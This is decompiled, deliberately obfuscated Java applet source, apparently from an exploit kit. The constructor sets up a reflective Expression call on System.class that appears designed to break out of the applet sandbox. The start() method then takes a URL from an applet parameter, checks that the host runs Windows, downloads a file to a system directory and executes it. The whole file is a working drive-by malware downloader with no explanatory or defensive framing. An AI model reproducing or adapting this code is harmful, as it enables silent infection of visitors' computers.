// 
// Decompiled by Procyon v0.5.30
// 

package kitsun;

import java.awt.Component;
import java.beans.Expression;
import sedze.lea6;
import sedze.kigun;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class boromir extends Applet
{
    public String kutry;
    public Runtime geriq;
    public int hlowvpi;
    public String kutrx;
    public HashSet hlowq;
    public JList hlowy;
    public String kutrq;
    public String hlowe;
    public URL hlowb;
    public String hlowa;
    public String hlowz;
    public InputStream hlowx;
    public String hlowc;
    public int hlowv;
    public FileOutputStream hlown;
    public String hlowm;
    public String hlows;
    public String hlowd;
    public String kutra;
    static Class geria;
    static Object[] gerif;
    
    static {
        boromir.geria = System.class;
        boromir.gerif = new Object[1];
    }
    
    private void gloin() {
        huno.kiuyuki(this.hlowb, trapper.gal());
        this.hlowx = (InputStream)huno.kiuyuki(this.hlowb, trapper.phutacuya());
    }
    
    private String tilorn(final String psr) {
        return System.getProperty(psr);
    }
    
    private void elendil() throws Exception {
        this.hlown = new FileOutputStream(this.kutra);
    }
    
    private void arodruin(final Object bofs) {
        huno.kiuyuki(bofs, trapper.anemone());
    }
    
    public void start() {
        super.start();
        trapper.gariba();
        kigun.matsuki();
        try {
            this.kutry = trapper.gelad();
            this.kutrx = trapper.konica();
            this.kutrq = kigun.katzue(this.getParameter("ezengard"));
            this.hlowe = "e".concat("ma".concat("n.".concat("so")));
            this.hlowa = trapper.milki(this.kutry);
            this.hlowb = new URL(this.kutrq);
            this.hlowz = trapper.milki(this.kutrx);
            this.hlowvpi = 24;
            this.hlowc = trapper.milki(this.hlowe);
            this.hlowm = trapper.gadzeru(this.hlowa);
            final Runtime runtime = Runtime.getRuntime();
            this.geriq = runtime;
            if (runtime == null) {}
            this.hlows = this.tilorn(this.hlowz);
            this.hlowd = this.tilorn(this.hlowc);
            this.kutra = String.valueOf(this.hlows) + this.hlowm;
            this.hlowv = 1000 + this.hlowvpi;
            try {
                if (this.hlowd.indexOf("W".concat("in").concat("do".concat("ws"))) < 0) {
                    return;
                }
                this.elendil();
                this.gloin();
                final byte[] kutrl = new byte[this.hlowv];
                int kutrm;
                while ((kutrm = this.hlowx.read(kutrl, 0, this.hlowv)) != -1) {
                    this.hlown.write(kutrl, 0, kutrm);
                }
                this.arodruin(this.hlowx);
                this.arodruin(this.hlown);
                huno.senqu(this.geriq, trapper.sansedo(), new Object[] { String.valueOf(this.hlows) + this.hlowm });
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        catch (Exception ex2) {
            ex2.printStackTrace();
        }
    }
    
    public boromir() {
        this.hlowq = new HashSet();
        trapper.gariba();
        kigun.matsuki();
        this.hlowq.add(new lea6(boromir.geria, trapper.iravady(), boromir.gerif));
        final Expression gerih = new Expression(boromir.geria, trapper.iravady(), boromir.gerif);
        final kiipol gerij = new kiipol(this, this.hlowq);
        this.add(this.hlowy = new JList((E[])new Object[] { gerij }));
    }
}
